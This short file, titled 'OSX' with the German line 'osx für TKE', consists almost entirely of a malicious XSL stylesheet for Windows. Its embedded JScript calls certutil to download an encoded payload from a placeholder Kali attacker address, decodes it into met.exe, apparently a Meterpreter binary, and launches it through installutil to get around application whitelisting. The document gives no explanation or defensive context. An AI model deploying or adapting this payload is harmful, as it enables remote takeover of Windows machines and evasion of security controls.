# OSX
osx für TKE


<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace%22%3E

<output method="text"/>
  <ms:script implements-prefix="user" language="JScript">
    <![CDATA[
      var ob = new ActiveXObject("WScript.Shell");
      ob.Run("certutil.exe -urlcache -f http://<Kali_IP_web>/met.enc C:\Users\Public\met.enc", 0, true);
      ob.Run("certutil.exe -decode C:\Users\Public\met.enc C:\Users\Public\met.exe", 0, true);
      ob.Run("C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Users\Public\met.exe", 0, true);
    ]]>
  </ms:script>
</stylesheet>
